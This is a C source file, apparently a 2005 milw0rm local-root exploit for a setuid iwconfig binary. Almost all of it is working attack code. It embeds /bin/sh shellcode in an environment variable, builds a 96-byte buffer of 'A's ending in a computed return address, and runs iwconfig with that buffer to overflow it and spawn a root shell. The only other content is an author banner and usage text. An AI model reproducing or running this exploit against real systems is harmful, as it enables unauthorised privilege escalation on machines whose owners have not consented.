// (if the iwconfig executable is setuid) /str0ke

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

/* 45 Byte /bin/sh >> http://www.milw0rm.com/id.php?id=1169 (https://www.exploit-db.com/exploits/1169/) */
char shellcode[]=
                 "\x31\xc0\x31\xdb\x50\x68\x2f\x2f"
                 "\x73\x68\x68\x2f\x62\x69\x6e\x89"
                 "\xe3\x50\x53\x89\xe1\x31\xd2\xb0"
                 "\x0b\x51\x52\x55\x89\xe5\x0f\x34"
                 "\x31\xc0\x31\xdb\xfe\xc0\x51\x52"
                 "\x55\x89\xe5\x0f\x34";

int main(int argc,char **argv){
  char buf[96];
  long esp, *addr_ptr;
  unsigned long ret;
  int i, offset;
  unsigned long sp(void)
  { __asm__("movl %esp, %eax");}
  char *prog[]={argv[1],buf,NULL};
  char *env[]={"3v1lsh3ll0=",shellcode,NULL};

  if (argc >= 2) {
    printf("\n*********************************************\n");
    printf("   iwconfig Version 26 Localroot Exploit    \n");
    printf("    Coded by Qnix[at]bsdmail[dot]org      \n");
    printf("*********************************************\n\n");
  } else {
    printf("\n*********************************************\n");
    printf("   iwconfig Version 26 Localroot Exploit    \n");
    printf("    Coded by Qnix[at]bsdmail[dot]org      \n");
    printf("*********************************************\n\n");
    printf("\n USEAGE: ./iwconfig-exploit <iwconfig FULLPATH e.g /sbin/iwconfig or /usr/sbin/iwconfig>\n\n");
    return 1;
    }

  offset = 0;
  esp = sp();
  ret=0xc0000000-strlen(shellcode)-strlen(prog[0])-0x06;
  printf("[~] S-p.ESP     : 0x%x\n", esp);
  printf("[~] O-F.ESP     : 0x%x\n", offset);
  printf("[~] Return Addr : 0x%x\n\n", ret);

  memset(buf,0x41,sizeof(buf));
  memcpy(&buf[92],&ret,4);

  execve(prog[0],prog,env);

 }

// milw0rm.com [2005-09-14]